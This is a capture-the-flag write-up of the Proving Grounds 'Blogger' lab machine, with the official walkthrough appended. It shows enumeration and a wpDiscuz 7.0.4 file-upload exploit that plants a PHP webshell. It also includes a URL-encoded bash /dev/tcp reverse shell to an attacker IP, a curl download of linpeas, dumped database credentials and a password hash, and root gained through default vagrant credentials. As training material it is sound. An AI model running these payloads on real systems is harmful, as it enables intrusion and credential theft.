---
title: Blogger
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
# Machine
## OS
## Level

---
# Reconnaissance
```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ nmap -T4 -A $IP -oN nmap.txt
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 04:05 +0900
Nmap scan report for 192.168.184.217
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 95:1d:82:8f:5e:de:9a:00:a8:07:39:bd:ac:ad:d3:44 (RSA)
|   256 d7:b4:52:a2:c8:fa:b7:0e:d1:a8:d0:70:cd:6b:36:90 (ECDSA)
|_  256 df:f2:4f:77:33:44:d5:93:d7:79:17:45:5a:a1:36:8b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.13 - 4.4
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   76.75 ms 192.168.45.1
2   76.73 ms 192.168.45.254
3   77.13 ms 192.168.251.1
4   77.21 ms 192.168.184.217

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.82 seconds
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ whatweb -a 3 http://$IP           
http://192.168.184.217 [200 OK] Apache[2.4.18], Bootstrap[4.0.0], Country[RESERVED][ZZ], Email[example@email.com,mail@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.184.217], JQuery[2.2.3], PasswordField, Script, Title[Blogger | Home]
```

![](../../../assets/images/Pasted%20image%2020260529041057.png)

![](../../../assets/images/Pasted%20image%2020260529041042.png)

[W3layouts](http://w3layouts.com/)

![](../../../assets/images/Pasted%20image%2020260529041138.png)

![](../../../assets/images/Pasted%20image%2020260529041606.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ feroxbuster \
-u http://$IP \   
-w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
-x html,git,php,txt,bak,zip,old \
-d 2 \
-t 25 \
-r \
--random-agent \
-C 403,404 \
-o ferox.txt
```

![](../../../assets/images/Pasted%20image%2020260529052106.png)

![](../../../assets/images/Pasted%20image%2020260529044207.png)

http://192.168.184.217/assets/fonts/blog/

![](../../../assets/images/Pasted%20image%2020260529044305.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ echo 192.168.184.217 blogger.pg | sudo tee -a /etc/hosts
[sudo] password for kali: 
192.168.184.217 blogger.pg
```
![](../../../assets/images/Pasted%20image%2020260529044558.png)

![](../../../assets/images/Pasted%20image%2020260529044810.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ wpscan --url http://blogger.pg/assets/fonts/blog/ --plugins-detection aggressive
```

```zsh
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2026-04-23T22:34:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.7
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2026-05-27T16:54:00.000Z
 | Readme: http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.6.56
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ searchsploit wpdiscuz
---------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                        |  Path
---------------------------------------------------------------------- ---------------------------------
Wordpress Plugin wpDiscuz 7.0.4 - Arbitrary File Upload (Unauthentica | php/webapps/49962.sh
WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthentica | php/webapps/49967.py
Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary File Uplo | php/webapps/49401.rb
---------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ python3 49967.py -u http://blogger.pg/assets/fonts/blog -p /?p=29
---------------------------------------------------------------
[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution
[-] File Upload Bypass Vulnerability - PHP Webshell Upload
[-] CVE: CVE-2020-24186
[-] https://github.com/hevox
--------------------------------------------------------------- 

[+] Response length:[59354] | code:[200]
[!] Got wmuSecurity value: 710169e218
[!] Got wmuSecurity value: 29 

[+] Generating random name for Webshell...
[!] Generated webshell name: bnqrombyizqeisf

[!] Trying to Upload Webshell..
[+] Upload Success... Webshell path:url&quot;:&quot;http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php&quot; 

>  

[x] Failed to execute PHP code..
```

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=id

![](../../../assets/images/Pasted%20image%2020260529053002.png)

http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=which%20nc

![](../../../assets/images/Pasted%20image%2020260529053105.png)


---

# Initial Access

https://www.tagindex.com/cgi-lib/encode/url.cgi

![](../../../assets/images/Pasted%20image%2020260529055408.png)
```zsh
http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/05/bnqrombyizqeisf-1780000071.8944.php?cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.45.195%2F4444%20%3C%261%27
```

![](../../../assets/images/Pasted%20image%2020260529055259.png)

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Play/Blogger]
└─$ rlwrap -cAr nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.184.217] 38392
bash: cannot set terminal process group (1364): Inappropriate ioctl for device
bash: no job control in this shell
<ress/assets/fonts/blog/wp-content/uploads/2026/05$ 
```

```zsh
<ress/assets/fonts/blog/wp-content/uploads/2026/05$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                               
<ress/assets/fonts/blog/wp-content/uploads/2026/05$ 
```

---

# Privilege Escalation
```zsh
www-data@ubuntu-xenial:/home$ cd ../
cd ../
www-data@ubuntu-xenial:/$ ls
ls
bin   dev   initrd.img      lib64       mnt   root  snap  tmp      var
boot  etc   initrd.img.old  lost+found  opt   run   srv   usr      vmlinuz
data  home  lib             media       proc  sbin  sys   vagrant  vmlinuz.old
www-data@ubuntu-xenial:/$ cd tmp
cd tmp
www-data@ubuntu-xenial:/tmp$ ls
ls
backup.tar.gz  vmware-root
www-data@ubuntu-xenial:/tmp$ curl http://192.168.45.214:8000/linpeas.sh -o linpeas.sh
<$ curl http://192.168.45.214:8000/linpeas.sh -o linpeas.sh                  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 1037k  100 1037k    0     0   232k      0  0:00:04  0:00:04 --:--:--  243k
www-data@ubuntu-xenial:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh
```

![](../../../assets/images/Pasted%20image%2020260530020640.png)

![](../../../assets/images/Pasted%20image%2020260530022011.png)

## Rabbit Hole1

![](../../../assets/images/Pasted%20image%2020260530022121.png)

```zsh
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data root 2878 Jan 17  2021 /var/www/wordpress/assets/fonts/blog/wp-config.php                                                                        
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'sup3r_s3cr3t');
define('DB_HOST', 'localhost');
```

```zsh
www-data@ubuntu-xenial:/tmp$ mysql -h localhost -u root -p
mysql -h localhost -u root -p
Enter password: sup3r_s3cr3t

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 12
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.00 sec)
```

```zsh
MariaDB [(none)]> use wordpress;
use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [wordpress]> show tables;
show tables;
+-----------------------------+
| Tables_in_wordpress         |
+-----------------------------+
| wp_commentmeta              |
| wp_comments                 |
| wp_links                    |
| wp_options                  |
| wp_postmeta                 |
| wp_posts                    |
| wp_term_relationships       |
| wp_term_taxonomy            |
| wp_termmeta                 |
| wp_terms                    |
| wp_usermeta                 |
| wp_users                    |
| wp_wc_avatars_cache         |
| wp_wc_comments_subscription |
| wp_wc_feedback_forms        |
| wp_wc_follow_users          |
| wp_wc_phrases               |
| wp_wc_users_rated           |
| wp_wc_users_voted           |
+-----------------------------+
19 rows in set (0.00 sec)

```

```zsh
MariaDB [wordpress]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | j@m3s      | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/ | jm3s          | admin@blogger.thm |          | 2021-01-17 12:40:06 |                     |           0 | j@m3s        |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)
```

## Rabbit Hole2

```zsh
www-data@ubuntu-xenial:/tmp$ cat /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh
#!/bin/sh
cd /home/james/
tar czf /tmp/backup.tar.gz *
www-data@ubuntu-xenial:/tmp$ 
```

---

```zsh
www-data@ubuntu-xenial:/home/james$ su vagrant
su vagrant
Password: vagrant

vagrant@ubuntu-xenial:/home/james$ sudo -l
sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
vagrant@ubuntu-xenial:/home/james$ sudo su
sudo su
root@ubuntu-xenial:/home/james# cat /root
cat /root
cat: /root: Is a directory
root@ubuntu-xenial:/home/james# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ubuntu-xenial:/home/james# cat /root/proof.txt
cat /root/proof.txt

root@ubuntu-xenial:/home/james# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:db:41 brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.217/24 brd 192.168.123.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:db41/64 scope link 
       valid_lft forever preferred_lft forever

```

<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Exploitation guide for Blogger
Summary
In this guide we will exploit an arbitary file upload in the wpDiscuz version 7.0.4 plugin and obtain root access with a simple and straightforward method of privilege escalation.

Enumeration
We begin the enumeration process with an nmap scan.

┌──(kali㉿kali)-[~]
└─$ nmap 192.168.120.183            

Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-05 04:19 MST
Nmap scan report for 192.168.120.183
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.40 seconds
We see ports 22 and 80 open on the target.

Navigating to port 80 we see the following static webpage.


Home
Home
Turning our attention to content discovery, we bruteforce directories with gobuster.

┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://192.168.120.183/  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.120.183/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/04 07:37:35 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> http://192.168.120.183/images/]
/assets               (Status: 301) [Size: 319] [--> http://192.168.120.183/assets/]
/css                  (Status: 301) [Size: 316] [--> http://192.168.120.183/css/]   
/js                   (Status: 301) [Size: 315] [--> http://192.168.120.183/js/] 
Navigating to the assets directory, we find a blog directory in the assets/fonts path which reveals a wordpress site.


wp
wp
During our enumeration we skim through the source code of any blog post and see that the site uses the wpDiscuz version 7.0.4 plugin.

┌──(kali㉿kali)-[~]
└─$ curl http://blogger.pg/assets/fonts/blog/?p=29
<!DOCTYPE html>
<html lang="en-US">

<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="http://blogger.pg/assets/fonts/blog/xmlrpc.php">
......
<link rel='stylesheet' id='wpdiscuz-frontend-css-css'  href='http://blogger.pg/assets/fonts/blog/wp-content/plugins/wpdiscuz/themes/default/style.css?ver=7.0.4' type='text/css' media='all' />
After researching the wpDiscuz version 7.0.4 plugin we see that it is vulnerable to an Unauthenticated Arbitrary File Upload.

Navigating to the comment section of any blog post, we see an upload form that accepts images.


comment section
comment section
As the comment section includes an upload form for images, we can attempt to upload a reverse shell in the GIF89a format, as it is common for any image upload functionality to allow GIFs as well.

We begin by grabbing a copy of a reverse shell to upload to the target, we will use the php-reverse-shell.php installed on kali by default.

┌──(kali㉿kali)-[~/blogger]
└─$ cp /usr/share/webshells/php/php-reverse-shell.php .
We can add GIF89a; to the beginning of our php-reverse-shell to bypass any filters.

GIF89a;
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
...
Next, we set up up a listener on our attack machine.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 443
listening on [any] 443 ...
Now we navigate to the comment section of any blog post, and attach our php-reverse-shell.php and fill in the necessary forms before submitting.


upload
upload
We receive a response in our listener and stabilize our shell by spawning a python3 shell.

┌──(kali㉿kali)-[~]
└─$ sudo nc -lvnp 443
listening on [any] 443 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.120.150] 42538
Linux ubuntu-xenial 4.4.0-206-generic #238-Ubuntu SMP Tue Mar 16 07:52:37 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 15:39:15 up 58 min,  1 user,  load average: 0.04, 0.04, 0.01
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1                      14:41   57:54   0.05s  0.03s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu-xenial:/$
Privilege Escalation
In the /home directory, we see the users james,ubuntu and vagrant.

www-data@ubuntu-xenial:/home$ ls
ls
james  ubuntu  vagrant
We can guess the credentials of the user vagrant as vagrant:vagrant.

www-data@ubuntu-xenial:/$ su vagrant
su vagrant
Password: vagrant
vagrant@ubuntu-xenial:/$
Running the “sudo -l” command reveals that the user vagrant is permitted to run all commands.

vagrant@ubuntu-xenial:/$ sudo -l
sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL

We can achieve root access by using sudo su.

vagrant@ubuntu-xenial:/$ sudo su 
sudo su 
root@ubuntu-xenial:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

</details>